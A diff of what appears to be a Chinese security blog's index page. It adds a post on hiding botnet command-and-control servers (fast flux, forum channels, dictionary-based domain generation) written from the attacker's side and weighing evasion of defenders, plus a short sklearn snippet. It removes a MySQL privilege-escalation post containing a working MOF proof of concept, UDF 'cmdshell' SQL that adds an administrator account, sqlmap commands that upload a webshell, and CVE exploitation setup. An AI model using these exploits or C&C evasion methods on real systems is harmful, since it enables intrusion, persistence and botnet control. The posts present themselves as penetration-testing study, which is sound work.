@@ -258,6 +258,215 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/C-C控制服务思路浅析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/08/03/C-C控制服务思路浅析/" itemprop="url">
+                  C&C控制服务思路浅析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-03T10:48:49+08:00">
+                2018-08-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/08/03/C-C控制服务思路浅析/" class="leancloud_visitors" data-flag-title="C&C控制服务思路浅析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在前面的博客中写过一次用python实现的后门 <a href="http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/06/17/%E5%9F%BA%E4%BA%8Epython%E7%9A%84%E7%9B%B4%E8%BF%9Eshell%E5%92%8C%E5%8F%8D%E5%B0%84shell/</a> 里面的代码用最简单的例子来实现了远程控制。</p>
+<p>但是当我们想要构建大规模僵尸网络的时候，就会发现这类简单的后门很不方便，我们不可能有时间一个一个手动的进行控制。而且大部分的肉鸡ip都是一直在变动而且无法直接访问的，所以远控中基本都使用反弹式通信，反弹式通信需要肉鸡每隔一段时间对我们的控制机发送心跳包，但是我们自己的电脑，ip很多情况也都是一直在变动的，我们很难保证自己拥有一个不变的公网ip。为了避免这些问题，我们就需要一台能够集中统一控制僵尸网络的主机，也就是C&amp;C服务器。</p>
+<ul>
+<li>C&amp;C服务器：command and control server(命令与控制服务器)。一般是指挥控制僵尸网络的主控服务器，用来和每个肉鸡进行通信并指挥它们的攻击行为。</li>
+</ul>
+<p>当然我这篇并不打算写一个简单的主控脚本和远控脚本，然后把它部署到公网服务器中，毕竟这些步骤只需要稍微改一下最开始那个链接里面脚本的代码就可以了。这篇我想要对通过各种方法部署和隐藏C&amp;C服务器的方法做一个总结。</p>
+<h2 id="0x01-通过IP地址访问C-amp-C服务器"><a href="#0x01-通过IP地址访问C-amp-C服务器" class="headerlink" title="0x01 通过IP地址访问C&amp;C服务器"></a>0x01 通过IP地址访问C&amp;C服务器</h2><p>最简单的方法就是租用一台云服务器，将服务器ip直接写远控脚本中反弹的ip中，然后所有肉鸡都会每隔一段时间与这个ip进行一次通信，我们也就可以在服务器上用脚本控制僵尸网络发动攻击。</p>
+<p>但是由于ip地址是直接写死在远控脚本或远控程序中的，如果对方捕获了远控脚本或者远控程序，进行简单的二进制逆向扫描就可以得到我们服务器ip地址，并且对方机器经常访问同一个ip也会增加被发现的几率。一旦被发现，对方直接将ip加入黑名单，并且将ip提交给我们购买云服务器的提供商，服务器被封禁就会使远控全部失效。</p>
+<p>优点：简单易实现、耗费小(仅服务器开销)。</p>
+<p>缺点：极易被发现、很容易大规模失效。</p>
+<h2 id="0x02-通过域名访问C-amp-C服务器"><a href="#0x02-通过域名访问C-amp-C服务器" class="headerlink" title="0x02 通过域名访问C&amp;C服务器"></a>0x02 通过域名访问C&amp;C服务器</h2><p>通过域名再指向服务器比起直接指向服务器只是将反弹ip改为反弹的域名。如果注册一些较正常的域名并且做一个伪装的主页，被发现的几率就会降低，而且直接二进制扫描不会被发现。但是逆向程序或着搭建蜜罐进行动态测试，很容易就能追踪到这些域名，将域名丢给运营商的黑名单就会造成大规模的远控失效。</p>
+<p>不过比起仅通过ip地址访问这种方式要多花去安全人员的一点时间，如果在这个时间内达成目的，也算是成功了。</p>
+<p>优点：简单易实现、耗费小(服务器和域名开销)。</p>
+<p>缺点：易被发现、很容易大规模失效。</p>
+<h2 id="0x03-Fast-flux"><a href="#0x03-Fast-flux" class="headerlink" title="0x03 Fast flux"></a>0x03 Fast flux</h2><p>如果一个域名很容易被蜜罐捕获的话，我们可以将几十个域名分散的写在代码中，这些域名都指向同一台服务器的ip地址，程序会对域名轮换访问，然后提供一个较短的ttl使域名对ip的解析记录也会不断的更换。</p>
+<p>这样被捕获某一部分域名添加黑名单并没有办法阻止恶意软件。而且因为ip解析记录一直变更也无法直接举报服务器，所以需要安全人员很高的逆向能力将恶意域名全部找出来。</p>
+<p>不过这个方式有两个缺陷，一个是将捕获的一部分恶意域名的ip解析历史记录进行统计、数据分析，也会很快找到服务器的ip地址。另一个缺陷是域名记录的TTL相比正常的过短，容易被抓住特征。</p>
+<p>优点：被发现后较难快速处理、被屏蔽一部分域名不会造成僵尸网络失效。</p>
+<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费较大(多个域名的开销)、一旦服务器ip被发现仍然会大规模失效。</p>
+<h2 id="0x04-Double-flux、Triple-flux"><a href="#0x04-Double-flux、Triple-flux" class="headerlink" title="0x04 Double flux、Triple flux"></a>0x04 Double flux、Triple flux</h2><p>既然Fast flux容易被捕获一部分恶意域名进行数据分析而发现ip，那域名能增加ip也能增加，Double flux就是在一般的fast flux过程中除了轮换域名，也让ip可以轮换，如果我们有M个域名和N个ip这样就产生了M*N组的C&amp;C通道，还有更多的干扰项。</p>
+<p>Triple flux在Double flux的基础上，增加一层Name Server通过CNAME方式解析，这样域名有可能指向ip也有可能指向别的域名，然后再指向ip，这些Name Server也会定期轮换，就增加了更多C&amp;C通道和干扰项。</p>
+<p>这两种方法都增加了安全人员分析的难度，而且不会因为个别的服务器或域名被封禁导致僵尸网络失效，但是仍然存在着和普通Fast flux一样的问题，那就是因为域名到ip的解析一直轮换导致TTL需要设置很短，很容易被抓取特征而捕获。</p>
+<p>优点：被发现后较难快速处理、被屏蔽一部分域名、封禁一部分ip都不会造成僵尸网络失效。</p>
+<p>缺点：实现需要足够的代码混淆和隐藏能力、耗费很大(多个域名和多个服务器的开销)。</p>
+<h2 id="0x05-使用论坛等作为C-amp-C服务器"><a href="#0x05-使用论坛等作为C-amp-C服务器" class="headerlink" title="0x05 使用论坛等作为C&amp;C服务器"></a>0x05 使用论坛等作为C&amp;C服务器</h2><p>自己架设服务器很容易被封禁，然后丢失僵尸网络的控制权，有的攻击者想到一个绝佳的办法：通过在一些论坛的冷门区域发一些C&amp;C控制指令，然后让恶意软件通过爬虫在访问这些论坛的时候获取指令，最开始主要是在twitter上进行C&amp;C控制，这种情况一开始很让安全人员头疼，因为访问这些论坛的请求本就和正常数据包差不多很难被发现，而且就算发现了，总不能把twitter的域名或者服务器添加很名单吧，这会影响网络的正常使用。后来发现了这种情况可以进行举报，从而封禁对应的账号。</p>
+<p>优点：耗费低、不是特别容易被发现。</p>
+<p>缺点：被发现后会被直接封禁账号损失僵尸网络。</p>
+<h2 id="0x06-使用随机域名生成算法"><a href="#0x06-使用随机域名生成算法" class="headerlink" title="0x06 使用随机域名生成算法"></a>0x06 使用随机域名生成算法</h2><p>比起注册一堆域名耗费巨大，更好的办法是使用DGA(Domain Generation Algorithm)算法，这种C&amp;C控制方法的思路就是控制一个确定的随机域名生成算法，用约定好的随机数种子生成大量的随机域名（如当天日期时间），恶意软件对这些域名全部进行访问，我们只需要按照规律注册其中个别有可能的域名就可以进行控制。</p>
+<p>这个方法的重点在于没有任何确定的域名写入到恶意软件里，即使逆向也找不到真正的域名，而且逆向出这个随机算法的难度非常大。并且生成的随机域名数量十分巨大对方无法得知究竟我们注册了哪个域名。由于随机算法(提前设定好)和随机种子(可以根据时间等生成)都是我们不需要通信就可以得知的信息，我们任何时候都可以知道该注册那种类型的域名可以进行控制。</p>
+<p>除非源码泄露，安全人员要逆向出DGA算法是非常困难的，也很难用黑名单的方式屏蔽掉所有的域名。目前应对这种C&amp;C的方法一般是利用机器学习算法去判定域名的随机性，然后筛选出有可能是恶意域名的域名进行分析找出ip，或者利用机器学习算法智能的屏蔽对这些域名的访问。</p>
+<p>天下没有免费的午餐，这种方式比起前面的方法也有一个缺陷，产生的随机域名过多且访问频率有限的时候，想通过C&amp;C服务器进行控制就需要等待较长的时间，所以在攻击时灵活度不足。强行减少等待的时间就得增加访问频率，就会增加被发现的概率。</p>
+<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
+<p>缺点：控制延迟很高、灵活度不足。</p>
+<h2 id="0x07-使用变形DGA算法"><a href="#0x07-使用变形DGA算法" class="headerlink" title="0x07 使用变形DGA算法"></a>0x07 使用变形DGA算法</h2><p>这个方法是为了对抗检测域名随机性的机器学习算法而产生的，大体步骤和上面相似，不同处是比起使用域名随机算法，添加一些英文单词作为字典构成域名，就比较接近正常的网页，不会被普通的机器学习算法检测出来。</p>
+<p>还是那句话，天下没有免费的午餐，添加字典减少了随机性，必然会缩小产生域名的数量，很快就会用完所有的域名。</p>
+<p>优点：非常难被封禁、很难通过逆向的方式解决掉恶意域名、耗费低(只需一台服务器和几个域名)。</p>
+<p>缺点：控制延迟很高、灵活度不足。</p>
+<h2 id="0x08-总结"><a href="#0x08-总结" class="headerlink" title="0x08 总结"></a>0x08 总结</h2><p>C&amp;C的设计与防御是目前攻防中很重要的一部分，围绕着C&amp;C，双方在攻防博弈中各显神通，完美的结合了机器学习、数据科学等知识，是非常有学习和研究价值的。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/01/python-scikit-learn学习-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -428,6 +637,7 @@
 <p>在这个程序中使用datasets中的make_classification方法产生拥有两个特征值的分类数据，然后就可以将两个特征值分别放在横轴和纵轴来观察数据分布</p>
 <p><img src="https://github.com/echohun/blog_image/blob/master/python_sklearn/sklearn10.png?raw=true" alt=""></p>
 <p>接着对比直接训练和标准化之后训练的精度，发现前后差距非常大。</p>
+<p>标准化还有一种常用的方式那就是将特征取值规定到一个范围（默认0-1），只需将最开始代码中标准化函数改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">min_max_scaler = preprocessing.MinMaxScaler()</span><br><span class="line">X_MinMax = min_max_scaler.fit_transform(x_train)</span><br></pre></td></tr></table></figure></p>
 <h2 id="0x03-交叉验证"><a href="#0x03-交叉验证" class="headerlink" title="0x03 交叉验证"></a>0x03 交叉验证</h2><p>之前在机器学习的模型评估方法里面学过几种模型验证的方法，其中也提到了，学习器训练完成后仍然在训练集种测试实际上是一种错误的方法，因为这个学习器在自身的训练集上很容易得到一个很高的分数，但是对新样本无法预测出任何有用的信息，这种情况被称为过拟合。</p>
 <p>所以为了避免这种情况，我们一般在验证的时候会将样本分为训练集和测试集，在之前的博客（ <a href="http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/" target="_blank" rel="noopener">http://next.uuzdaisuki.com/2018/07/24/机器学习-5-——模型评估方法/</a> ）介绍了留数法、交叉验证法、自助法这几种方法来分割训练集与测试集。</p>
 <p>前面的程序我们大多使用train_test_split方法将样本分为两部分，也就是留数法，那么这里就使用sklearn实现交叉验证法。</p>
@@ -2304,287 +2514,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/02/mysql数据库提权总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/07/02/mysql数据库提权总结/" itemprop="url">
-                  mysql数据库提权总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-02T10:34:30+08:00">
-                2018-07-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/07/02/mysql数据库提权总结/" class="leancloud_visitors" data-flag-title="mysql数据库提权总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>数据库提权是提权中比较常用的手段，并且sql注入漏洞相对较多，比较好入手，这次整理一下mysql数据库提权的常用手段。</p>
-<h2 id="0x01-MOF提权"><a href="#0x01-MOF提权" class="headerlink" title="0x01 MOF提权"></a>0x01 MOF提权</h2><h3 id="MOF文件"><a href="#MOF文件" class="headerlink" title="MOF文件"></a>MOF文件</h3><p>MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡。</p>
-<h3 id="MOF提权原理"><a href="#MOF提权原理" class="headerlink" title="MOF提权原理"></a>MOF提权原理</h3><p>MOF文件既然每五秒就会执行，而且是系统权限，我们通过mysql将文件写入一个MOF文件替换掉原有的MOF文件，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，我们可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
-<li>Windows&lt;=2003</li>
-<li>mysql在c:windows/system32/mof目录有写权限</li>
-<li>已知数据库账号密码</li>
-</ul>
-<p>我们可以看到，这个提权方式条件非常严苛，数据库在system32写文件这个条件一般很难达到。而且较新的系统就无法使用MOF提权了。</p>
-<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>这里提供一个poc,需要更改的部分只有一条命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace = &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name = &quot;filtP2&quot;;</span><br><span class="line">Query = &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second = 5&quot;;</span><br><span class="line">QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScriptText =</span><br><span class="line">&quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user test 123456 /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer = $Consumer;</span><br><span class="line">Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>确保了前面的条件之后，我们可以先上传我们的mof文件到服务器任意目录，一般是网站允许上传的目录。</p>
-<p>然后通过mysql语句将这个文件导入到nullevt.mof<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;F:/wamp/www/upload/test.mof&quot;) into dumpfile &quot;c:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure></p>
-<p>这里用到了dumpfile而不是outfile是因为：</p>
-<ul>
-<li>dumpfile只能导出一行数据</li>
-<li>outfile可以完整的导出每行记录，并且会在行末端写入新行，并且会转义换行符。</li>
-</ul>
-<p>如果用outfile这个二进制可执行文件就会被破坏，所以这里我们使用了dumpfile。</p>
-<p>然后我们分别两次将创建用户和提权命令替换poc中的命令做上述操作即可。两次使用的命令如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net.exe user test 123456 /add</span><br><span class="line"></span><br><span class="line">net.exe user localgroup administrators test /add</span><br></pre></td></tr></table></figure></p>
-<p>然后我们使用net user命令就可以看到我们新加入的账户，提权成功。</p>
-<h3 id="应对"><a href="#应对" class="headerlink" title="应对"></a>应对</h3><ul>
-<li>最根本的防御是过滤sql注入</li>
-<li>如果一旦被MOF提权，这个语句会被一直执行，要彻底删掉账号需要先停止加载工作，然后删掉文件，再删掉入侵者留下的账号，最后重启服务即可。  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop winmgmt</span><br><span class="line">del c:/windows/system32/wbem/repository</span><br><span class="line">net start winmgmt</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h2 id="0x02-UDF提权"><a href="#0x02-UDF提权" class="headerlink" title="0x02 UDF提权"></a>0x02 UDF提权</h2><h3 id="UDF"><a href="#UDF" class="headerlink" title="UDF"></a>UDF</h3><p>UDF,user defined funcion,即用户自定义函数。用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。</p>
-<h3 id="UDF提权原理"><a href="#UDF提权原理" class="headerlink" title="UDF提权原理"></a>UDF提权原理</h3><p>通过添加用户自定义函数导出dll，然后在mysql中使用用户自定义函数以高权限账号执行命令，添加账号进行提权。</p>
-<h3 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
-<li>windows2003、windowsXP、windows7</li>
-<li>拥有mysql的insert和delete权限</li>
-</ul>
-<h3 id="UDF-php"><a href="#UDF-php" class="headerlink" title="UDF.php"></a>UDF.php</h3><p><a href="https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php" target="_blank" rel="noopener">https://github.com/echohun/tools/blob/master/%E5%A4%A7%E9%A9%AC/udf.php</a></p>
-<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>首先我们要判断mysql版本，根据不同的版本：</p>
-<ul>
-<li><p>mysql版本 &lt; 5.2 , UDF导出到系统目录c:/windows/system32/</p>
-</li>
-<li><p>mysql版本 &gt; 5.2 ，UDF导出到安装路径MySQL\Lib\Plugin\</p>
-</li>
-</ul>
-<p>也可以直接查询插件安装目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like %plugin%</span><br></pre></td></tr></table></figure></p>
-<p>然后我们上传udf.php到网站中</p>
-<p>在udf.php中将udf.dll导出到插件目录</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv01.png?raw=true" alt=""></p>
-<p>然后执行sql语句创建用户自定义函数,并利用他执行命令提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create function cmdshell returns string soname &apos;udf.dll&apos;;</span><br><span class="line">select cmdshell(&apos;net user test 123456 /add&apos;);</span><br><span class="line">select cmdshell(&apos;net localgroup administrators test /add&apos;);</span><br><span class="line">drop function cmdshell; 删除函数</span><br><span class="line">delete from mysql.func where name=&apos;cmdshell&apos;  删除函数</span><br></pre></td></tr></table></figure></p>
-<p>在将udf.dll文件导出到lib\plugin目录下时，如果plugin不存在，可以用NTFS ADS流来创建文件夹并导入dll<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   </span><br><span class="line">//查找到mysql的目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&apos;;   </span><br><span class="line">//利用NTFS ADS创建lib目录</span><br><span class="line">select &apos;It is dll&apos; into dumpfile &apos;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&apos;;</span><br><span class="line">//利用NTFS ADS创建plugin目录</span><br></pre></td></tr></table></figure></p>
-<h3 id="自动化"><a href="#自动化" class="headerlink" title="自动化"></a>自动化</h3><p>使用sqlmap自动化上传插件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;xxxx&apos; --file-write=/lib_mysqludf_sys.so  --file-dest=/usr/lib/mysql/plugin/</span><br></pre></td></tr></table></figure></p>
-<p>激活sys_exec函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;xxxx&apos; --sql-shell</span><br></pre></td></tr></table></figure></p>
-<p>利用sqlmap上传后门<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &apos;xxxx&apos; --file-write=c:/phpspy.php --file-dest=/var/www/spy.php</span><br></pre></td></tr></table></figure></p>
-<h3 id="应对-1"><a href="#应对-1" class="headerlink" title="应对"></a>应对</h3><ul>
-<li>最根本的防御是过滤sql注入</li>
-<li>限制mysql的写入权限</li>
-</ul>
-<h2 id="0x03-CVE-2016-6663和CVE-2016-6664"><a href="#0x03-CVE-2016-6663和CVE-2016-6664" class="headerlink" title="0x03 CVE-2016-6663和CVE-2016-6664"></a>0x03 CVE-2016-6663和CVE-2016-6664</h2><p>上面两种方式条件都太过严苛，应对一些新的系统就没有用武之地了，所以再介绍一下利用下面两个CVE配合起来提权的方式，相对需求条件要宽松的多，很多情况都可以成功提权。</p>
-<h3 id="CVE-2016-6663"><a href="#CVE-2016-6663" class="headerlink" title="CVE-2016-6663"></a>CVE-2016-6663</h3><p>CVE-2016-6663是竞争条件（race condition）漏洞，它能够让一个低权限账号（拥有CREATE/INSERT/SELECT权限）提升权限并且以系统用户身份执行任意代码。也就是说，我们可以通过他得到一整个mysql的权限。</p>
-<h3 id="CVE-2016-6664"><a href="#CVE-2016-6664" class="headerlink" title="CVE-2016-6664"></a>CVE-2016-6664</h3><p>CVE-2016-6664是root权限提升漏洞，这个漏洞可以让拥有MySQL系统用户权限的攻击者提升权限至root，以便进一步攻击整个系统。</p>
-<p>导致这个问题的原因其实是因为MySQL对错误日志以及其他文件的处理不够安全，这些文件可以被替换成任意的系统文件，从而被利用来获取root权限。</p>
-<p>可以看到，两个cve分别是用来将低权限的www-data权限提升为mysql权限，然后再将mysql提升为root权限</p>
-<h3 id="CVE-2016-6663利用条件"><a href="#CVE-2016-6663利用条件" class="headerlink" title="CVE-2016-6663利用条件"></a>CVE-2016-6663利用条件</h3><ul>
-<li>1.已经getshell，获得www-data权限</li>
-<li>2.获取到一个拥有create,drop,insert,select权限的数据库账号，密码</li>
-<li>3.提权过程需要在交互式的shell环境中运行，所以需要反弹shell再提权</li>
-<li>4.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
-</ul>
-<h3 id="CVE-2016-6664利用条件"><a href="#CVE-2016-6664利用条件" class="headerlink" title="CVE-2016-6664利用条件"></a>CVE-2016-6664利用条件</h3><ul>
-<li>1.目标主机配置必须是是基于文件的日志(默认配置)，也就是不能是syslog方式（通过cat /etc/mysql/conf.d/mysqld_safe_syslog.cnf查看没有包含“syslog”字样即可）</li>
-<li>2.需要在mysql权限下运行才能利用</li>
-<li>3.Mysql&lt;5.5.51或&lt;5.6.32或&lt;5.7.14</li>
-</ul>
-<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>打开docker，拉取镜像tutum/lamp。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull tutum/lamp</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv02.png?raw=true" alt=""></p>
-<p>运行docker并连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -P tutum/lamp</span><br><span class="line">docker ps</span><br><span class="line">docker exec -it &lt;container_id&gt; /bin/bash</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv03.png?raw=true" alt=""></p>
-<p>更新apt，并安装wget，gcc，libmysqlclient-dev<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install -y wget gcc libmysqlclient-dev</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/mysql_priv/mysql_priv04.png?raw=true" alt=""></p>
-<p>这里假设我们已经拿到一个www-data这种低权限的webshell和一个拥有create,drop,insert,select权限的数据库账号，密码。</p>
-<p>所以我们手动写入webshell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/webshell.php</span><br></pre></td></tr></table></figure></p>
